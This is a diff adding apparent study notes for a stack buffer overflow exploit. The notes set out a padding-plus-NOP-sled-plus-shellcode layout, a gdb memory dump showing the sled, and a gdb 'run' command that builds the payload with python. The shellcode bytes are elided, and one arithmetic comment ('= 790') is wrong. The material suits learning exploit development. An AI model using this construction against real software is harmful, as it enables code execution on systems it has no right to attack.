@@ -1,0 +1,19 @@
+   Buffer = "\x55" * (2064 - 100 - 95 - 4) = 790
+      NOPs = "\x90" * 100
+ Shellcode = "\xba\x3d\x4b...\x19\x7c\x07"           # Payload 95 bytes 
+       EIP = "\x66" * 4                              # setting the EIP 0xffffd72c
+
+<SNIP>    
+0xffffd6d4:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55                                       
+0xffffd6dc:     0x55    0x55    0x90    0x90    0x90    0x90    0x90    0x90  
+    # End of "\x55"s   ---->|  |---> NOPS                
+<SNIP>               
+0xffffd71c:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90                                       
+0xffffd724:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90                                       
+0xffffd72c:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90                                       
+0xffffd734:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90                                       
+0xffffd73c:     0x90    0x90    0x90    0x90    0x90    0x90    0xba    0x3d                                      
+                                                             # |---> Shellcode
+                                                             
+
+run $(python -c 'print "\x55" * (2064 - 100 - 95 - 4) + "\x90" * 100 + "\xba\x3d\x4b\...\x7c\x07" + "\x2c\xd7\xff\xff"')
